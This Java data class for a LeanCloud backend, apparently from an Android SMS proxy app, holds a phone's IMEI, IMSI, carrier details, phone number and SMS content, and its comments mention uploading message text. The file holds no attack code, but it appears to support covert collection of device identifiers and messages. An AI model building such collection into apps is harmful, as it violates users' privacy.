package com.android.sms.proxy.entity;

import com.avos.avoscloud.AVClassName;
import com.avos.avoscloud.AVObject;

/**
 * @author zyq 16-3-31
 */
@AVClassName("SmsSimInfo")
public class SmsSimInfo extends AVObject {

	public static final Creator CREATOR = AVObjectCreator.instance;
	public static final String IMEI = "imei";
	public static final String IMSI = "imsi";
	public static final String OPERATORS = "operatorsNumber";//运营商电话
	public static final String OPERATORCODE = "operatorCode";//运营商查询指令
	public static final String PHONENUMBER = "line1PhoneNumber";//有可能获取电话号码
	public static final String MESSAGEINFO = "messageInfo";//上传短信内容


	public SmsSimInfo() {
	}

	public String getIMEI() {
		return getString(IMEI);
	}

	public String getIMSI() {
		return getString(IMSI);
	}

	public String getOperators() {
		return getString(OPERATORS);
	}

	public String getOperatorcode() {
		return getString(OPERATORCODE);
	}

	public String getPhonenumber() {
		return getString(PHONENUMBER);
	}

	public String getMessageinfo() {
		return getString(MESSAGEINFO);
	}

	public void setImei(String imei) {
		put(IMEI, imei);
	}

	public void setImsi(String imsi) {
		put(IMSI, imsi);
	}

	public void setOperators(String operators) {
		put(OPERATORS, operators);
	}

	public void setOperatorcode(String operatorcode) {
		put(OPERATORCODE, operatorcode);
	}

	public void setPhonenumber(String phoneNumber) {
		put(PHONENUMBER, phoneNumber);
	}

	public void setMessageinfo(String messageInfo) {
		put(MESSAGEINFO, messageInfo);
	}



}
